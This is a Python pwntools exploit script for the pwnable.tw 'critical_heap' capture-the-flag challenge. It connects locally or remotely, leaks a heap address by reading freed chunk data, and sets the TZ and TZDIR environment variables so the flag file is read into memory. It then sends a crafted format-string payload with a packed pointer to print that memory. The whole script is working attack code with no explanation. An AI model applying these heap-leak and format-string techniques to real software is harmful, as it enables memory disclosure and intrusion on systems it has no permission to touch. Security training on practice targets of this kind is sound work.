from pwn import *
import sys

host = 'chall.pwnable.tw'
port = 10500

local = True
if len(sys.argv) > 1:
    local = False
    r = remote(host, port)
else:
    r = process('./critical_heap')


def create_normal_chk(name, ctx):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', name)
    r.sendlineafter(':', '1')
    r.sendafter(':', ctx)

def create_system_chk(name):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', name)
    r.sendlineafter(':', '3')

def create_time_chk(name):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', name)
    r.sendlineafter(':', '2')

def delete_chk(idx):
    r.sendlineafter(':', '5')
    r.sendlineafter(':', str(idx))

def show_chk(idx):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(idx))

def set_system_chk(key, value, get=False):
    r.sendlineafter(':', '4')
    r.sendlineafter(':', '0') # idx
    r.sendlineafter(':', '1') # set name
    r.sendlineafter(':', key) # key
    r.sendlineafter(':', value) # value
    if get == True:
        r.sendlineafter(':', '4') # get name
        r.sendlineafter(':', key) # key
    r.sendlineafter(':', '5') # return

if local == True:
    heap_offset = 0x85
    flag_path = '/home/parallels/critical_heap'
else:
    heap_offset = 0x145
    flag_path = '/home/critical_heap++'

# play it and store heap address to '&node + 0x20'

create_system_chk('setenv')
set_system_chk('aaaa', 'a'*0x20, True)
delete_chk(0)

# leak heap
create_normal_chk('leak', 'A'*8)
show_chk(0)
r.recvuntil('A'*8)
heap = u64(r.recvuntil('\n').strip().ljust(8, '\x00')) - heap_offset
log.info('heap: ' + hex(heap))
delete_chk(0)

# set TZ
create_system_chk('set_TZ')
set_system_chk('TZ', 'flag')

# set TZDIR
set_system_chk('TZDIR', flag_path)
delete_chk(0)

# create time chk
create_time_chk('time')

# fmt
target = heap + 0x5f0
payload = '%c%c%c%c%c%c%c%c%c%c%c%c%sAAAAAA' + p64(target) + '\x0a'
create_normal_chk('fmt', 'ctx')
r.sendlineafter(':', '4')
r.sendlineafter(':','1') # idx
r.sendlineafter(':', '2') # change ctx
r.sendlineafter(':', payload)
r.sendlineafter(':', '1') # printf_chk
r.recvuntil('%%%%')

leak = r.recvuntil('AAAAAA')[:-6]
log.info('leak: ' + leak)

r.interactive()

